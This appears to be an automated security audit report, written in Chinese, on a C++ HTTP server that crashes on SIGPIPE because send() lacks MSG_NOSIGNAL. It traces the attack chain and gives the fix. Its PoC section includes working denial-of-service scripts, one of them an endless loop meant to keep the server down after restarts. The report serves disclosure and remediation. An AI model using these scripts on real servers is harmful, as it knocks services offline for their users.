# VULN-SEC-CPP-CONFIG-HTTP-007: HTTP 服务器 send() 未处理 SIGPIPE 信号导致远程拒绝服务

**严重性**: High | **CWE**: CWE-400 (Uncontrolled Resource Consumption) | **置信度**: 85/100
**位置**: `src/http_server.cpp:131` @ `run`
**语言/框架**: C++ / POSIX Sockets
**分析类型**: config
**Source/Sink**: network_socket → signal_handling
**规则/证据来源**: c_cpp.config.no_sigpipe / llm

---

## 1. 漏洞细节

该 HTTP 服务器在 `run()` 方法的主循环中使用 `send()` 系统调用向客户端发送 HTTP 响应，但未采取任何措施防止 SIGPIPE 信号导致进程终止。

具体而言，存在两个关键缺陷：

1. **`send()` 调用未使用 `MSG_NOSIGNAL` 标志**：第 131 行 `send(client, raw.data(), raw.size(), 0)` 的第四个参数（flags）为 `0`，未设置 `MSG_NOSIGNAL`。当客户端在 `send()` 执行前已关闭 TCP 连接时，内核会向进程发送 SIGPIPE 信号。

2. **整个代码库未处理 SIGPIPE 信号**：经过对整个项目的全面搜索，未发现任何 `signal(SIGPIPE, SIG_IGN)`、`sigaction()` 调用，甚至没有 `#include <signal.h>`。SIGPIPE 的默认处置（default disposition）是**终止进程**。

当远程客户端建立 TCP 连接、发送 HTTP 请求、然后在服务器调用 `send()` 之前关闭连接时，`send()` 会触发 SIGPIPE 信号，导致整个服务器进程立即终止。由于该服务器是单线程、单进程的架构，进程终止意味着**所有正在处理和后续的服务请求全部中断**。

### 证据摘要

- 触发源: network_socket（任何 TCP 连接）
- 危险点: signal_handling（SIGPIPE 默认终止进程）
- 已检查的清洗/缓解: 无。整个代码库中不存在 `signal(SIGPIPE, SIG_IGN)`、`sigaction()`、`MSG_NOSIGNAL` 标志或 `#include <signal.h>`
- 关键证据:
  - `send(client, raw.data(), raw.size(), 0)` — flags 参数为 0，无 MSG_NOSIGNAL
  - grep 搜索 `SIGPIPE|MSG_NOSIGNAL|signal\s*\(|sigaction` 在整个项目中返回零匹配
  - grep 搜索 `#include.*signal|signal\.h` 在整个项目中返回零匹配
  - `main.cpp` 中也无任何信号处理逻辑

## 2. 漏洞代码

**文件**: `src/http_server.cpp` (行 81-134)

```cpp
int HttpServer::run() {
  int fd = ::socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    throw std::runtime_error("socket failed");
  }

  int reuse = 1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

  sockaddr_in address {};
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(static_cast<uint16_t>(port_));

  if (bind(fd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) < 0) {
    close(fd);
    throw std::runtime_error("bind failed");
  }

  if (listen(fd, 16) < 0) {
    close(fd);
    throw std::runtime_error("listen failed");
  }

  for (;;) {
    int client = accept(fd, nullptr, nullptr);          // 行 106: 接受新连接
    if (client < 0) {
      continue;
    }

    char buffer[4096];
    std::memset(buffer, 0, sizeof(buffer));
    ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // 行 113: 接收请求
    if (n <= 0) {
      close(client);
      continue;
    }

    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);
    }

    std::string raw = serializeResponse(response);
    send(client, raw.data(), raw.size(), 0);  // ★ 行 131: flags=0，无 MSG_NOSIGNAL
    close(client);                             // 行 132: 永远不会执行到这里
  }
}
```

**逐段分析**：

- **行 106**：`accept()` 接受来自任意远程客户端的 TCP 连接，无需任何认证或过滤。
- **行 113**：`recv()` 接收客户端的 HTTP 请求数据。如果此时客户端已关闭连接，`recv()` 返回 ≤ 0，代码正确处理了此情况（关闭 socket 并 continue）。
- **行 119-128**：解析请求并调用对应的路由处理器，生成 HTTP 响应。
- **行 130**：`serializeResponse()` 将响应序列化为字符串。
- **行 131（漏洞点）**：`send()` 以 flags=0 发送响应。如果客户端在 `recv()` 返回之后、`send()` 执行之前关闭了连接（即发送了 RST 或 FIN），内核将向进程发送 SIGPIPE 信号。由于没有任何信号处理，进程立即终止。

**注意**：在 `recv()` 和 `send()` 之间存在时间窗口（请求解析 + 路由处理 + 响应序列化），攻击者有充足的时间在此窗口内关闭连接。

## 3. 完整攻击链路

```
[攻击者] 远程客户端（任意主机）
↓ TCP SYN 连接至服务器端口（默认 8080）
[入口点] accept()@src/http_server.cpp:106
↓ 返回新的 client socket fd
[接收请求] recv(client, buffer, ...)@src/http_server.cpp:113
↓ 攻击者发送合法 HTTP 请求（如 "GET /health HTTP/1.1\r\n\r\n"）
↓ recv() 成功返回，服务器开始处理请求
[攻击者关闭连接] — 在服务器处理期间，攻击者发送 RST/FIN 关闭 TCP 连接
↓ 请求解析 parseRequest()@src/http_server.cpp:119
↓ 路由匹配 handlers_.find()@src/http_server.cpp:120
↓ 响应序列化 serializeResponse()@src/http_server.cpp:130
[漏洞触发] send(client, raw.data(), raw.size(), 0)@src/http_server.cpp:131
↓ 内核检测到连接已关闭，向进程发送 SIGPIPE 信号
↓ SIGPIPE 默认处置 = 终止进程
[结果] 服务器进程立即终止，服务完全不可用
```

**攻击链路详细说明**：

1. **连接建立**：攻击者向服务器监听端口（默认 8080）发起 TCP 连接。`accept()` 在行 106 接受连接，不做任何来源验证。

2. **发送请求**：攻击者发送一个合法的 HTTP 请求（例如 `GET /health HTTP/1.1\r\n\r\n`），确保 `recv()` 在行 113 成功返回（n > 0）。

3. **关闭连接**：在 `recv()` 返回后、`send()` 执行前的时间窗口内，攻击者主动关闭 TCP 连接（发送 RST 或 FIN）。这个时间窗口包括请求解析、路由查找和响应序列化，通常有数毫秒到数十毫秒。

4. **触发 SIGPIPE**：当 `send()` 在行 131 尝试向已关闭的 socket 写入数据时，Linux 内核向进程发送 SIGPIPE 信号。

5. **进程终止**：由于代码中没有任何 SIGPIPE 处理（无 `signal(SIGPIPE, SIG_IGN)`、无 `sigaction()`、无 `MSG_NOSIGNAL`），SIGPIPE 的默认处置生效——进程立即终止。

## 4. 攻击场景

**攻击者画像**: 任何能够通过网络访问服务器端口的远程攻击者，无需认证、无需任何特权。

**攻击向量**: 网络 TCP 连接。攻击者只需能够与服务器建立 TCP 连接即可，可通过互联网、内网或任何可达的网络路径发起攻击。

**利用难度**: **低** — 仅需基本的网络编程知识，使用几行 Python 代码或标准工具即可触发。

### 攻击步骤

1. 使用脚本或工具连接到目标服务器的 HTTP 端口（默认 8080）
2. 发送一个合法的 HTTP 请求头（确保服务器 `recv()` 成功返回）
3. 立即关闭 TCP 连接（设置 SO_LINGER 发送 RST 以加速触发）
4. 服务器在处理完请求后调用 `send()` 时触发 SIGPIPE，进程终止
5. 服务器完全不可用，需要手动重启

**持续攻击**：如果服务器由 systemd 等守护进程管理器自动重启，攻击者可以通过自动化脚本反复触发此漏洞，实现持续性拒绝服务。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | TCP 端口可达   | 攻击者需要能够与服务器建立 TCP 连接（默认端口 8080，可通过命令行参数自定义） |
| 认证要求   | 无需认证       | `accept()` 接受所有连接，不进行任何身份验证或来源过滤                  |
| 配置依赖   | 无特殊配置要求 | 服务器默认运行即受影响，无需任何特殊配置或运行模式                     |
| 环境依赖   | Linux/POSIX    | SIGPIPE 是 POSIX 标准信号，在所有 Linux/Unix 系统上行为一致。macOS 同样受影响 |
| 时序条件   | 宽松的时间窗口 | `recv()` 和 `send()` 之间存在请求解析 + 路由处理的时间窗口，攻击者有充足时间关闭连接 |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                     |
| -------- | ---- | ---------------------------------------------------------------------------------------- |
| 机密性   | 无   | 漏洞不会导致信息泄露                                                                     |
| 完整性   | 无   | 漏洞不会导致数据篡改                                                                     |
| 可用性   | **高** | 服务器进程立即终止，所有正在处理的请求中断，后续请求无法被处理。单进程架构意味着完全的服务中断 |

**影响范围**: 全局影响。由于服务器采用单进程、单线程架构，SIGPIPE 导致的进程终止会影响所有服务功能。所有已注册的路由（`/health`、`/login`、`/files`、`/debug/ping`、`/admin/export`）均不可用。如果该服务器作为边缘网关（edge gateway）运行，其崩溃将导致后端所有服务不可达。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请在授权范围内使用。

### PoC 1: Python 脚本（推荐）

```python
#!/usr/bin/env python3
"""
SIGPIPE DoS PoC — 仅供安全测试使用
触发 HTTP 服务器因未处理 SIGPIPE 而崩溃
"""
import socket
import sys
import time

def trigger_sigpipe(host, port):
    """连接服务器、发送请求、立即关闭连接以触发 SIGPIPE"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 设置 SO_LINGER 使 close() 发送 RST 而非 FIN
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, 
                    bytes([1, 0, 0, 0, 0, 0, 0, 0]))  # l_onoff=1, l_linger=0
    sock.settimeout(5)
    
    try:
        sock.connect((host, port))
        # 发送合法 HTTP 请求确保 recv() 成功返回
        request = b"GET /health HTTP/1.1\r\nHost: localhost\r\n\r\n"
        sock.sendall(request)
        # 立即关闭连接（SO_LINGER 会发送 RST）
        sock.close()
        print(f"[+] 已发送请求并强制关闭连接 (RST)")
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return False
    
    # 等待一小段时间让服务器处理并触发 SIGPIPE
    time.sleep(0.5)
    
    # 验证服务器是否已崩溃
    try:
        verify = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        verify.settimeout(3)
        verify.connect((host, port))
        verify.close()
        print("[-] 服务器仍在运行（可能需要多次尝试或调整时序）")
        return False
    except (ConnectionRefusedError, socket.timeout):
        print("[!] 服务器已崩溃 — SIGPIPE DoS 成功")
        return True

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 发送请求并立即关闭连接...")
    trigger_sigpipe(host, port)
```

### PoC 2: Bash 单行命令

```bash
# 仅供安全测试使用
# 使用 nc (netcat) 发送请求后立即断开
echo -ne "GET /health HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc -q 0 127.0.0.1 8080

# 验证服务器是否存活
sleep 0.5 && nc -z 127.0.0.1 8080 && echo "服务器仍在运行" || echo "服务器已崩溃"
```

### PoC 3: 循环攻击脚本（持续性 DoS）

```python
#!/usr/bin/env python3
"""
持续 DoS PoC — 仅供安全测试使用
反复触发 SIGPIPE 使服务器无法恢复
"""
import socket, time, sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
        s.settimeout(2)
        s.connect((host, port))
        s.sendall(b"GET /health HTTP/1.1\r\n\r\n")
        s.close()
        print(f"[+] RST 已发送，等待服务器崩溃...")
    except Exception:
        print(f"[-] 服务器不可达（可能已崩溃），等待重启后重试...")
    time.sleep(1)
```

**使用说明**: 

1. 在测试环境中启动目标服务器：`./edge-gateway 8080`
2. 运行 PoC 脚本：`python3 sigpipe_dos.py 127.0.0.1 8080`
3. 观察服务器进程是否终止

**预期结果**: 服务器进程在收到 SIGPIPE 后立即终止，终端可能显示 "Broken pipe" 错误信息。后续连接尝试将被拒绝（Connection refused）。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+、Debian 11+、CentOS 8+ 等任何发行版）
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+
- 依赖: 无外部依赖，仅使用 POSIX 标准库和 C++ 标准库

### 构建步骤

```bash
# 克隆/获取项目源码后
cd /path/to/project
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build .
# 生成可执行文件: build/edge-gateway
```

**注意**：不要添加 `-DMSG_NOSIGNAL` 或其他自定义编译宏。使用项目默认的 CMakeLists.txt 构建即可复现。

### 运行配置

```bash
# 启动服务器（默认端口 8080）
./build/edge-gateway

# 或指定端口
./build/edge-gateway 9090
```

无需任何特殊配置文件或环境变量。

### 验证步骤

1. 在终端 A 启动服务器：`./build/edge-gateway 8080`
2. 在终端 B 验证服务器正常运行：`curl http://127.0.0.1:8080/health`，应返回 `ok`
3. 在终端 B 运行 PoC 脚本：`python3 sigpipe_dos.py 127.0.0.1 8080`
4. 观察终端 A：服务器进程应已终止
5. 在终端 B 验证服务器已崩溃：`curl http://127.0.0.1:8080/health`，应返回 `Connection refused`

### 预期结果

- 服务器进程在 `send()` 调用时收到 SIGPIPE 信号
- 进程立即终止（退出码通常为 141，即 128 + 13，其中 13 是 SIGPIPE 的信号编号）
- 终端可能显示 "Broken pipe" 信息
- 所有后续连接请求被拒绝（Connection refused）
- 使用 `dmesg` 或 `journalctl` 可能看到进程被信号终止的记录

### 修复建议

修复此漏洞只需在以下两处任选其一：

**方案 A**（推荐）：在 `main()` 函数开头忽略 SIGPIPE 信号：
```cpp
#include <signal.h>
// 在 main() 开头添加：
signal(SIGPIPE, SIG_IGN);
```

**方案 B**：在 `send()` 调用中使用 `MSG_NOSIGNAL` 标志：
```cpp
send(client, raw.data(), raw.size(), MSG_NOSIGNAL);
```

两种方案均可防止 SIGPIPE 终止进程。方案 A 影响全局，方案 B 仅影响特定调用点。建议同时采用两种方案以实现纵深防御。
